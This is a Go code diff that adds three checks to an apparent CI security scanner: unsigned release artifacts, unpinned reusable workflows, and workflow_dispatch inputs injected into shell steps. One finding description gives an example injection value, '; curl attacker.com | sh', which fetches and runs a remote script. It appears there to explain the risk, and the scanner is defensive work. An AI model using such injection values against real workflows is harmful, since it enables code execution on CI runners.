@@ -92,6 +92,9 @@ func (s *Scanner) Run(ctx context.Context, target string, _ module.ScanType) ([]
 		all = append(all, checkCachePoisoning(content, repoSlug)...)
 		all = append(all, checkLongLivedCloudCreds(content, repoSlug)...)
 		all = append(all, checkPATUsedInWorkflow(content, repoSlug)...)
+		all = append(all, checkArtifactSigning(content, repoSlug)...)
+		all = append(all, checkReusableWorkflowPinning(content, repoSlug)...)
+		all = append(all, checkWorkflowDispatchInjection(content, repoSlug)...)
 	}
 
 	return all, nil
@@ -865,6 +868,168 @@ func checkPATUsedInWorkflow(workflowYAML, repo string) []finding.Finding {
 			Title:    fmt.Sprintf("PAT secret %q used in workflow — prefer GITHUB_TOKEN or GitHub App token", orig),
 			Description: desc,
 			Evidence:    map[string]any{"secret": orig},
+			DiscoveredAt: time.Now(),
+		})
+	}
+	return findings
+}
+
+// -------------------------------------------------------------------------
+// Artifact signing check
+// -------------------------------------------------------------------------
+
+// reReleaseTriggerAny detects any release or tag-push trigger pattern.
+var reReleaseTriggerAny = regexp.MustCompile(`(?m)^\s*(release:|on:\s*\[.*release|push:.*tags:)`)
+
+// reArtifactProducers detects steps that produce release artifacts.
+var reArtifactProducers = regexp.MustCompile(
+	`(?i)uses:\s*(actions/upload-artifact|goreleaser/goreleaser|softprops/action-gh-release|ncipollo/release-action|svenstaro/upload-release-action)`,
+)
+
+// reArtifactSigning detects signing tools present in the workflow.
+var reArtifactSigning = regexp.MustCompile(
+	`(?i)(sigstore/cosign-installer|github/attest-build-provenance|slsa-framework/slsa-github-generator|anchore/sbom-action|sigstore/gh-action-sigstore-python|sigstore/cosign)`,
+)
+
+// checkArtifactSigning flags release workflows that produce artifacts without signing them.
+func checkArtifactSigning(workflowYAML, repo string) []finding.Finding {
+	if !reReleaseTriggerAny.MatchString(workflowYAML) {
+		return nil
+	}
+	if !reArtifactProducers.MatchString(workflowYAML) {
+		return nil
+	}
+	if reArtifactSigning.MatchString(workflowYAML) {
+		return nil
+	}
+	return []finding.Finding{{
+		CheckID:  finding.CheckGHActionUnsignedRelease,
+		Module:   "github",
+		Scanner:  scannerName,
+		Severity: finding.SeverityMedium,
+		Asset:    repo,
+		Title:    "Release workflow produces artifacts without signing",
+		Description: "A release workflow produces artifacts (via upload-artifact, goreleaser, or a " +
+			"release action) but does not include a signing step (cosign, GitHub Artifact Attestations, " +
+			"or SLSA provenance generation). Unsigned release artifacts cannot be verified by " +
+			"downstream consumers — a compromised artifact upload or storage bucket could silently " +
+			"substitute a malicious binary. Add artifact signing using github/attest-build-provenance " +
+			"or sigstore/cosign-installer, and publish the signature alongside the release.",
+		Evidence:     map[string]any{"vector": "unsigned release artifacts"},
+		DiscoveredAt: time.Now(),
+	}}
+}
+
+// -------------------------------------------------------------------------
+// Reusable workflow pinning check
+// -------------------------------------------------------------------------
+
+// reReusableWorkflowRef matches external reusable workflow references:
+// uses: owner/repo/.github/workflows/foo.yml@ref
+// Group 1 = full ref, Group 2 = ref portion after @
+var reReusableWorkflowRef = regexp.MustCompile(
+	`uses:\s+(([^./\s][^/\s]*/[^/\s]+)/\.github/workflows/[^\s@]+@([^\s#]+))`,
+)
+
+// checkReusableWorkflowPinning flags external reusable workflows not pinned to a full SHA.
+func checkReusableWorkflowPinning(workflowYAML, repo string) []finding.Finding {
+	var findings []finding.Finding
+	seen := make(map[string]struct{})
+
+	for _, m := range reReusableWorkflowRef.FindAllStringSubmatch(workflowYAML, -1) {
+		if len(m) < 4 {
+			continue
+		}
+		fullRef := strings.TrimSpace(m[1]) // e.g. "org/repo/.github/workflows/ci.yml@v1"
+		ref := strings.TrimSpace(m[3])     // e.g. "v1"
+
+		if reFullSHA.MatchString(ref) {
+			continue // already pinned to a commit SHA
+		}
+		if _, ok := seen[fullRef]; ok {
+			continue
+		}
+		seen[fullRef] = struct{}{}
+
+		findings = append(findings, finding.Finding{
+			CheckID:  finding.CheckGHActionReusableWorkflowUnpinned,
+			Module:   "github",
+			Scanner:  scannerName,
+			Severity: finding.SeverityMedium,
+			Asset:    repo,
+			Title:    fmt.Sprintf("Unpinned reusable workflow: %s", fullRef),
+			Description: fmt.Sprintf(
+				"The workflow calls external reusable workflow %q using a mutable tag or branch ref "+
+					"rather than an immutable 40-character commit SHA. If the upstream workflow is "+
+					"compromised or the tag is moved, the next run will silently execute attacker-controlled "+
+					"CI code with access to your repository secrets. Pin to a full SHA: "+
+					"uses: %s@<40-char-sha>  # %s", fullRef, actionBase(fullRef), ref),
+			Evidence:     map[string]any{"reusable_workflow": fullRef, "ref": ref},
+			DiscoveredAt: time.Now(),
+		})
+	}
+	return findings
+}
+
+// -------------------------------------------------------------------------
+// workflow_dispatch input injection
+// -------------------------------------------------------------------------
+
+// reDispatchInputSink matches ${{ inputs.* }} expressions embedded in run: steps.
+var reDispatchInputSink = regexp.MustCompile(`\$\{\{\s*inputs\.\w+\s*\}\}`)
+
+// checkWorkflowDispatchInjection flags run: steps that embed workflow_dispatch inputs directly.
+func checkWorkflowDispatchInjection(workflowYAML, repo string) []finding.Finding {
+	// Only relevant for workflows that have workflow_dispatch trigger.
+	if !strings.Contains(workflowYAML, "workflow_dispatch") {
+		return nil
+	}
+
+	var findings []finding.Finding
+	inRun := false
+	runIndent := 0
+
+	for _, line := range strings.Split(workflowYAML, "\n") {
+		trimmed := strings.TrimSpace(line)
+
+		if isRunKey(trimmed) {
+			inRun = true
+			runIndent = len(line) - len(strings.TrimLeft(line, " \t"))
+		} else if inRun {
+			currentIndent := len(line) - len(strings.TrimLeft(line, " \t"))
+			isNewKey := len(trimmed) > 0 &&
+				!strings.HasPrefix(trimmed, "#") &&
+				currentIndent <= runIndent &&
+				(strings.Contains(trimmed, ": ") || strings.HasSuffix(trimmed, ":")) &&
+				!strings.Contains(trimmed, "${{")
+			if isNewKey {
+				inRun = false
+			}
+		}
+
+		if !inRun {
+			continue
+		}
+
+		m := reDispatchInputSink.FindString(line)
+		if m == "" {
+			continue
+		}
+
+		findings = append(findings, finding.Finding{
+			CheckID:  finding.CheckGHActionWorkflowDispatchInjection,
+			Module:   "github",
+			Scanner:  scannerName,
+			Severity: finding.SeverityCritical,
+			Asset:    repo,
+			Title:    fmt.Sprintf("workflow_dispatch input injected into shell command: %s", m),
+			Description: fmt.Sprintf(
+				"A run: step embeds the workflow_dispatch input expression %q directly in a shell "+
+					"command. Any user with permission to trigger the workflow can supply a value "+
+					"containing shell metacharacters (e.g. `; curl attacker.com | sh`) to execute "+
+					"arbitrary commands on the runner. Use an intermediate environment variable instead:\n"+
+					"env:\\n  VALUE: %s\\nrun: echo \"$VALUE\"", m, m),
+			Evidence:     map[string]any{"injection_sink": m},
 			DiscoveredAt: time.Now(),
 		})
 	}
